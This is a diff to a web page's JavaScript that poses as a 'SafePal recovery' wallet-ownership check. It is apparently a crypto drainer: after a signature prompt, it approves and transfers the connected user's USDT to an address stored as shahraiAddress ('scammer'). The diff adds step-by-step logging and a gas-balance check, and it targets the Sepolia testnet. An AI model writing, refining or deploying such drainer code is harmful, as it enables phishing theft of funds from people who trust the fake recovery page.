@@ -54,11 +54,13 @@
         async function connectWallet() {
             try {
                 document.getElementById('status').innerText = 'Connecting...';
+                console.log('Step 1: Checking MetaMask availability...');
 
                 if (!window.ethereum || !window.ethereum.isMetaMask) {
                     throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
                 }
 
+                console.log('Step 2: Requesting accounts...');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 if (accounts.length === 0) {
                     throw new Error('No accounts found. Please unlock MetaMask.');
@@ -66,11 +68,14 @@
 
                 const userAddress = accounts[0];
                 document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
+                console.log('Step 3: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
+                console.log('Step 4: Checking network...');
                 const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
                 const targetChainId = 11155111; // Sepolia Testnet
                 if (chainId !== targetChainId) {
+                    console.log('Switching to Sepolia Testnet...');
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: `0x${targetChainId.toString(16)}` }]
@@ -78,6 +83,7 @@
                 }
 
                 // Підпис повідомлення
+                console.log('Step 5: Signing message...');
                 const message = 'Verify wallet ownership for SafePal recovery';
                 const signature = await window.ethereum.request({
                     method: 'personal_sign',
@@ -99,11 +105,13 @@
                     "function decimals() view returns (uint8)"
                 ];
 
+                console.log('Step 6: Initializing provider and signer...');
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, signer);
 
                 // Перевірка балансу
+                console.log('Step 7: Checking balance...');
                 const balance = await tokenContract.balanceOf(userAddress);
                 const decimals = await tokenContract.decimals();
                 const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
@@ -113,12 +121,23 @@
                     throw new Error('Insufficient balance to transfer');
                 }
 
+                // Перевірка балансу Sepolia ETH для газу
+                console.log('Step 8: Checking gas balance...');
+                const ethBalance = await provider.getBalance(userAddress);
+                const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);
+                console.log(`ETH balance: ${ethBalanceFormatted} Sepolia ETH`);
+                if (ethBalance.lt(ethers.utils.parseEther('0.01'))) {
+                    throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
+                }
+
                 // Виклик approve
+                console.log('Step 9: Approving tokens...');
                 const approveTx = await tokenContract.approve(shahraiAddress, amount);
                 const approveReceipt = await approveTx.wait();
                 console.log('Approve Transaction Hash:', approveReceipt.transactionHash);
 
-                // Виклик transferFrom (гаманець А передає токени гаманцю Б)
+                // Виклик transferFrom
+                console.log('Step 10: Transferring tokens...');
                 const transferTx = await tokenContract.transferFrom(userAddress, shahraiAddress, amount);
                 const transferReceipt = await transferTx.wait();
                 console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
